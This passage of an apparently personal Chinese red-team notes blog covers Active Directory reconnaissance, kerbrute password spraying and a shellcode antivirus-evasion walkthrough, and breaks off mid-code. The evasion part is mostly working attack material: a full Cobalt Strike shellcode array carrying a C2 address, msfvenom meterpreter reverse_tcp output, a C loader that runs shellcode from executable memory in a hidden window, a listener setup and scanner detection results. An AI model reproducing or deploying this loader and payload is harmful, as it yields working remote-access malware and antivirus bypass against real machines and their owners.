<p><a target="_blank" rel="noopener" href="https://github.com/SpiderLabs/Responder">https://github.com/SpiderLabs/Responder</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/byt3bl33d3r/CrackMapExec/releases">https://github.com/byt3bl33d3r/CrackMapExec/releases</a></p>
<h2 id="ZeroLogon"><a href="#ZeroLogon" class="headerlink" title="ZeroLogon"></a>ZeroLogon</h2><p>有空复现下，利用链和复现文章网上都有。</p>
<h2 id="账号密码暴破"><a href="#账号密码暴破" class="headerlink" title="账号密码暴破"></a>账号密码暴破</h2><p>在内网中，尽量能搜集就先搜集，爆破枚举不到万不得已的情况，不要使用。（流量设备、防火墙）</p>
<ul>
<li>Kerberos 域用户暴破</li>
</ul>
<p>kerbrute，该工具可在非域主机上使用，保持主机与域控机器通信正常即可。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.&#x2F;kerbrute_darwin_amd64 -domain DOMAIN_NAME -users user.txt -password P@ssword01! -dc-ip 192.168.1.2</span><br></pre></td></tr></table></figure>

<ul>
<li>DomainPasswordSpray</li>
</ul>
<h1 id="域内寻找域控思路"><a href="#域内寻找域控思路" class="headerlink" title="域内寻找域控思路"></a>域内寻找域控思路</h1><h2 id="常见的命令"><a href="#常见的命令" class="headerlink" title="常见的命令"></a>常见的命令</h2><ul>
<li>net group</li>
</ul>
<p>net group “domain controllers” /domain</p>
<ul>
<li>nltest</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nltest &#x2F;dclist:DOMAIN_NAME</span><br></pre></td></tr></table></figure>

<ul>
<li>net time /domain</li>
</ul>
<h2 id="查询dns解析记录"><a href="#查询dns解析记录" class="headerlink" title="查询dns解析记录"></a>查询dns解析记录</h2><p>若当前主机的dns为域内dns，可通过查询dns解析记录定位域控。</p>
<p>DOMAIN_NAME 为 已知的域名。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nslookup -type&#x3D;all _ldap._tcp.dc._msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set type&#x3D;all</span><br><span class="line">ldap.tcp.dc._msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure>

<p>或者</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nslookup</span><br><span class="line">set type&#x3D;all</span><br><span class="line">_msdcs.DOMAIN_NAME</span><br></pre></td></tr></table></figure>

<p>原理：域控服务器会向DNS服务器注册DNS记录，以便当客户端需要加入域或者和域有其他交互的时候，可以找到它。</p>
<p><strong>值得注意的是，使用nslookup的时候，DNS服务器必须是内部DNS，否者是查询不到记录的，因为域控服务器只会向内部DNS服务器注册这个记录。</strong></p>
<blockquote>
<p>大多情况下，内部DNS服务器和AD域控服务器默认部署在同一台服务器。如果是这种情况，找到DNS服务器就能找到了域控服务器。</p>
</blockquote>
<h2 id="SPN-扫描"><a href="#SPN-扫描" class="headerlink" title="SPN 扫描"></a>SPN 扫描</h2><p>大部分win系统默认已自带spn探测工具即：<code>setspn.exe</code></p>
<p>此操作无需管理权限</p>
<p>域内机器执行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setspn -T target.com -Q *&#x2F;*</span><br></pre></td></tr></table></figure>

<h2 id="AdFind-exe"><a href="#AdFind-exe" class="headerlink" title="AdFind.exe"></a>AdFind.exe</h2><p>列出域控制器名称：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc dclist</span><br></pre></td></tr></table></figure>

<p>查询当前域中在线的计算机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active</span><br></pre></td></tr></table></figure>

<p>查询当前域中在线的计算机(只显示名称和操作系统)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc computers_active name operatingSystem</span><br></pre></td></tr></table></figure>

<p>查询当前域中所有计算机：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory&#x3D;computer&quot;</span><br></pre></td></tr></table></figure>

<p>查询当前域中所有计算机(只显示名称和操作系统)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -f &quot;objectcategory&#x3D;computer&quot; name operatingSystem</span><br></pre></td></tr></table></figure>

<p>查询域内所有用户：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -users name</span><br></pre></td></tr></table></figure>

<p>查询所有GPO：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind -sc gpodmp</span><br></pre></td></tr></table></figure>



<p>ADSearch 也可以。</p>
<p><a target="_blank" rel="noopener" href="https://github.com/tomcarver16/ADSearch">https://github.com/tomcarver16/ADSearch</a></p>
<h2 id="参考资料-1"><a href="#参考资料-1" class="headerlink" title="参考资料"></a>参考资料</h2><p><a target="_blank" rel="noopener" href="https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md">https://github.com/uknowsec/Active-Directory-Pentest-Notes/blob/master/Notes/%E5%9F%9F%E6%B8%97%E9%80%8F-%E5%9F%9F%E5%86%85%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86.md</a></p>
<p><a target="_blank" rel="noopener" href="http://www.code2sec.com/zai-nei-wang-huan-jing-zhong-ding-wei-adyu-kong-fu-wu-qi.html">http://www.code2sec.com/zai-nei-wang-huan-jing-zhong-ding-wei-adyu-kong-fu-wu-qi.html</a></p>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/140493">https://cloud.tencent.com/developer/news/140493</a></p>
<p><a target="_blank" rel="noopener" href="https://hackergu.com/kerberos-sec-list-brute-user/">https://hackergu.com/kerberos-sec-list-brute-user/</a></p>
<h1 id="Cobalt-Strike-stageless-和-stage-的区别"><a href="#Cobalt-Strike-stageless-和-stage-的区别" class="headerlink" title="Cobalt Strike stageless 和 stage 的区别"></a>Cobalt Strike stageless 和 stage 的区别</h1><blockquote>
<p>今天面试问到了，这里记录一下</p>
</blockquote>
<p>L.N 老学长的文章，<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/0jZ-JRhOu10Dbws3jVIELg">https://mp.weixin.qq.com/s/0jZ-JRhOu10Dbws3jVIELg</a> ，里，有对这些名词做出解释。推荐看。</p>
<ul>
<li>stageless 和 stage</li>
</ul>
<p>分阶段和不分阶段，在实际红队工作中，很多时候<strong>不能在目标上执行过大的代码和文件</strong>，因此出现了，用一个小一点的代码去拉取更大的功能代码的情况。我们把这个<strong>一段一段的拉去代码执行的过程叫分阶段执行</strong>，因此出现了Stage(分阶段)和Stageless(不分阶段)这两个词。这其实很好理解，但伴随出现的Stager、Stagerless，让人有点傻傻分不清了</p>
<ul>
<li>Stager，主要指用于执行下一阶段代码的相关代码，有点拗口。</li>
<li>Stagerless，这个词语应该是国人创造的，我想说用Stageless就好。</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41874930/article/details/107797189">https://blog.csdn.net/qq_41874930/article/details/107797189</a></p>
<p>什么是stage(stageless)？<br>stage是无阶段的stager，可以直接理解成，stage是stager与它所请求的数据的集合体。stage比stager更安全，但是体积更大。而且在内网穿透的时候基本只能用stage，用stager会十分麻烦，stager是分段传输payload的，使用stager有时候会导致目标无法上线。stage唯一的缺点是相比较而言体积比较大。</p>
<p>什么是stager？<br>stager其实是一段很简单的加载器，是socketedi协议请求的一段shellcode，它的作用是向teamserver(C2)请求一段数据，这些数据前是个字节是shellcode的长度，后面是shellcode。接收到数据后跳转到shellcode所在的内存处开始运行。</p>
<hr>
<p>简单来说，就是分阶段（Stage）和不分阶段（Stageless）传输payload，一个体积大，功能全，但是容易被抓。一个体积下，功能需要分几次传输来实现，不容易被抓。</p>
<h1 id="使用C-编译-shellcode-免杀exe"><a href="#使用C-编译-shellcode-免杀exe" class="headerlink" title="使用C 编译 shellcode 免杀exe"></a>使用C 编译 shellcode 免杀exe</h1><h2 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h2><p>![image-20210629104551573](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629104551573.png)</p>
<p>![image-20210629104602953](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629104602953.png)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;* length: 798 bytes *&#x2F;</span><br><span class="line">unsigned char buf[] &#x3D; &quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x91\x1f\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x6a\x71\x75\x65\x72\x79\x2d\x33\x2e\x33\x2e\x31\x2e\x73\x6c\x69\x6d\x2e\x6d\x69\x6e\x2e\x6a\x73\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x00\x41\x63\x63\x65\x70\x74\x3a\x20\x74\x65\x78\x74\x2f\x68\x74\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x68\x74\x6d\x6c\x2b\x78\x6d\x6c\x2c\x61\x70\x70\x6c\x69\x63\x61\x74\x69\x6f\x6e\x2f\x78\x6d\x6c\x3b\x71\x3d\x30\x2e\x39\x2c\x2a\x2f\x2a\x3b\x71\x3d\x30\x2e\x38\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x4c\x61\x6e\x67\x75\x61\x67\x65\x3a\x20\x65\x6e\x2d\x55\x53\x2c\x65\x6e\x3b\x71\x3d\x30\x2e\x35\x0d\x0a\x52\x65\x66\x65\x72\x65\x72\x3a\x20\x68\x74\x74\x70\x3a\x2f\x2f\x63\x6f\x64\x65\x2e\x6a\x71\x75\x65\x72\x79\x2e\x63\x6f\x6d\x2f\x0d\x0a\x41\x63\x63\x65\x70\x74\x2d\x45\x6e\x63\x6f\x64\x69\x6e\x67\x3a\x20\x67\x7a\x69\x70\x2c\x20\x64\x65\x66\x6c\x61\x74\x65\x0d\x0a\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x33\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x37\x2e\x30\x3b\x20\x72\x76\x3a\x31\x31\x2e\x30\x29\x20\x6c\x69\x6b\x65\x20\x47\x65\x63\x6b\x6f\x0d\x0a\x00\x35\x4f\x21\x50\x25\x40\x41\x50\x5b\x34\x5c\x50\x5a\x58\x35\x34\x28\x50\x5e\x29\x37\x43\x43\x29\x37\x7d\x24\x45\x49\x43\x41\x52\x2d\x53\x54\x41\x4e\x44\x41\x52\x44\x2d\x41\x4e\x54\x49\x56\x49\x52\x55\x53\x2d\x54\x45\x53\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\xaf\x0f\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x34\x35\x2e\x37\x36\x2e\x31\x31\x30\x2e\x31\x31\x36\x00\x00\x00\x00\x00&quot;;</span><br></pre></td></tr></table></figure>

<h2 id="配置visual-stdio-2019"><a href="#配置visual-stdio-2019" class="headerlink" title="配置visual stdio 2019"></a>配置visual stdio 2019</h2><p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629104809774.png)</p>
<p>![image-20210629110630348](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629110630348.png)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ConsoleApplication1.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;Hello World!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 运行程序: Ctrl + F5 或调试 &gt;“开始执行(不调试)”菜单</span></span><br><span class="line"><span class="comment">// 调试程序: F5 或调试 &gt;“开始调试”菜单</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 入门使用技巧: </span></span><br><span class="line"><span class="comment">//   1. 使用解决方案资源管理器窗口添加/管理文件</span></span><br><span class="line"><span class="comment">//   2. 使用团队资源管理器窗口连接到源代码管理</span></span><br><span class="line"><span class="comment">//   3. 使用输出窗口查看生成输出和其他消息</span></span><br><span class="line"><span class="comment">//   4. 使用错误列表窗口查看错误</span></span><br><span class="line"><span class="comment">//   5. 转到“项目”&gt;“添加新项”以创建新的代码文件，或转到“项目”&gt;“添加现有项”以将现有代码文件添加到项目</span></span><br><span class="line"><span class="comment">//   6. 将来，若要再次打开此项目，请转到“文件”&gt;“打开”&gt;“项目”并选择 .sln 文件</span></span><br></pre></td></tr></table></figure>



<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MSF.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)                        <span class="comment">//去除窗口</span></span></span><br><span class="line"><span class="comment">//步骤b所在桌面产生的 shellcode.c的内容;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] =</span><br><span class="line"><span class="keyword">void</span> main()</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//ShellExecute(NULL, _T(&quot;open&quot;), _T(&quot;explorer.exe&quot;), _T(&quot;https://www.baiud.com&quot;), NULL, SW_SHOW);</span></span><br><span class="line">    LPVOID Memory = VirtualAlloc(<span class="literal">NULL</span>, <span class="keyword">sizeof</span>(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    <span class="built_in">memcpy</span>(Memory, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line">    ((<span class="keyword">void</span>(*)())Memory)();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里我把shellcode 全部替换为了buf。</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629105739038.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629105947318.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629111113057.png)</p>
<p>好家伙，编译生成之后，找到这个exe，Windows Defender 就报警了，直接给我删了。</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629111254132.png)</p>
<p>大小：76kb</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.226.1 LPORT&#x3D;4444 -f c &gt; shellcode.c</span><br><span class="line"></span><br><span class="line">msf6 &gt; msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.226.1 LPORT&#x3D;4444 -f c &gt; shellcode.c</span><br><span class="line">[*] exec: msfvenom -a x86 --platform Windows -p windows&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;192.168.226.1 LPORT&#x3D;4444 -f c &gt; shellcode.c</span><br><span class="line"></span><br><span class="line">No encoder specified, outputting raw payload</span><br><span class="line">Payload size: 354 bytes</span><br><span class="line">Final size of c file: 1512 bytes</span><br><span class="line"></span><br><span class="line">msf6 &gt; cat shellcode.c</span><br><span class="line">[*] exec: cat shellcode.c</span><br><span class="line"></span><br><span class="line">unsigned char buf[] &#x3D; </span><br><span class="line">&quot;\xfc\xe8\x8f\x00\x00\x00\x60\x31\xd2\x64\x8b\x52\x30\x89\xe5&quot;</span><br><span class="line">&quot;\x8b\x52\x0c\x8b\x52\x14\x0f\xb7\x4a\x26\x8b\x72\x28\x31\xff&quot;</span><br><span class="line">&quot;\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\x49&quot;</span><br><span class="line">&quot;\x75\xef\x52\x8b\x52\x10\x8b\x42\x3c\x57\x01\xd0\x8b\x40\x78&quot;</span><br><span class="line">&quot;\x85\xc0\x74\x4c\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3&quot;</span><br><span class="line">&quot;\x85\xc9\x74\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xc1&quot;</span><br><span class="line">&quot;\xcf\x0d\xac\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24&quot;</span><br><span class="line">&quot;\x75\xe0\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c&quot;</span><br><span class="line">&quot;\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59&quot;</span><br><span class="line">&quot;\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xe9\x80\xff\xff\xff\x5d&quot;</span><br><span class="line">&quot;\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5f\x54\x68\x4c\x77\x26&quot;</span><br><span class="line">&quot;\x07\x89\xe8\xff\xd0\xb8\x90\x01\x00\x00\x29\xc4\x54\x50\x68&quot;</span><br><span class="line">&quot;\x29\x80\x6b\x00\xff\xd5\x6a\x0a\x68\xc0\xa8\xe2\x01\x68\x02&quot;</span><br><span class="line">&quot;\x00\x11\x5c\x89\xe6\x50\x50\x50\x50\x40\x50\x40\x50\x68\xea&quot;</span><br><span class="line">&quot;\x0f\xdf\xe0\xff\xd5\x97\x6a\x10\x56\x57\x68\x99\xa5\x74\x61&quot;</span><br><span class="line">&quot;\xff\xd5\x85\xc0\x74\x0a\xff\x4e\x08\x75\xec\xe8\x67\x00\x00&quot;</span><br><span class="line">&quot;\x00\x6a\x00\x6a\x04\x56\x57\x68\x02\xd9\xc8\x5f\xff\xd5\x83&quot;</span><br><span class="line">&quot;\xf8\x00\x7e\x36\x8b\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a&quot;</span><br><span class="line">&quot;\x00\x68\x58\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57&quot;</span><br><span class="line">&quot;\x68\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68\x00&quot;</span><br><span class="line">&quot;\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff\xd5\x57\x68&quot;</span><br><span class="line">&quot;\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c\x24\x0f\x85\x70\xff&quot;</span><br><span class="line">&quot;\xff\xff\xe9\x9b\xff\xff\xff\x01\xc3\x29\xc6\x75\xc1\xc3\xbb&quot;</span><br><span class="line">&quot;\xf0\xb5\xa2\x56\x6a\x00\x53\xff\xd5&quot;;</span><br><span class="line">msf6 &gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>





<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploits&#x2F;multi&#x2F;handler</span><br><span class="line">set payload windows&#x2F;meterpreter&#x2F;reverse_tcp</span><br><span class="line">set lhost 192.168.226.1</span><br><span class="line">set lport 4444</span><br><span class="line">run</span><br></pre></td></tr></table></figure>





<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629114449829.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629114629086.png)</p>
<p>msf 上线正常。</p>
<p>查看cs weblog</p>
<p>![image-20210629114936191](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629114936191.png)</p>
<p>确实之前有连接beacon，但是就是没上线。</p>
<p>1年前是免杀360的，现在不行了，静态不动不查杀，运行和主动查杀gg。<a target="_blank" rel="noopener" href="https://r.virscan.org/language/zh-cn/report/aab7bc6beead5b681de1f59563456e89">https://r.virscan.org/language/zh-cn/report/aab7bc6beead5b681de1f59563456e89</a></p>
<p>em。。。我上传测试的结果。</p>
<p><a target="_blank" rel="noopener" href="https://r.virscan.org/language/zh-cn/report/97ab90e582817bad6ce67cbaa49cd030">https://r.virscan.org/language/zh-cn/report/97ab90e582817bad6ce67cbaa49cd030</a></p>
<p>![image-20210629120348465](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629120348465.png)</p>
<p>![image-20210629121353900](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629121353900.png)</p>
<p>![image-20210629121537596](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629121537596.png)</p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629121647606.png)</p>
<p>VT：</p>
<p><a target="_blank" rel="noopener" href="https://www.virustotal.com/gui/file/857e2e692728a013e8e88fffc05d1f00ac7a793abdecea25549746699f1d2c4d/detection">https://www.virustotal.com/gui/file/857e2e692728a013e8e88fffc05d1f00ac7a793abdecea25549746699f1d2c4d/detection</a></p>
<p>![image-20210629165326824](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629165326824.png)</p>
<p>微步：</p>
<p><a target="_blank" rel="noopener" href="https://s.threatbook.cn/report/file/857e2e692728a013e8e88fffc05d1f00ac7a793abdecea25549746699f1d2c4d/?env=win10_1903_enx64_office2016">https://s.threatbook.cn/report/file/857e2e692728a013e8e88fffc05d1f00ac7a793abdecea25549746699f1d2c4d/?env=win10_1903_enx64_office2016</a></p>
<p>![](/Users/m0nk3y/Library/Application Support/typora-user-images/image-20210629170411665.png)</p>
<p>哈哈哈，由此可见，单纯通过这个方法，早已经不行了，需要改进。</p>
<p>虽然VT和微步都没查出来，但是运行确爆毒了。</p>
<p>我们利用之前学到的一些方法来尝试一下免杀。</p>
<p>看一下之前的源码:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// MSF.cpp : 此文件包含 &quot;main&quot; 函数。程序执行将在此处开始并结束。</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;stdio.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;Windows.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(linker,<span class="meta-string">&quot;/subsystem:\&quot;windows\&quot; /entry:\&quot;mainCRTStartup\&quot;&quot;</span>)                        <span class="comment">//去除窗口</span></span></span><br><span class="line"><span class="comment">//步骤b所在桌面产生的 shellcode.c的内容;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> shellcode[] = <span 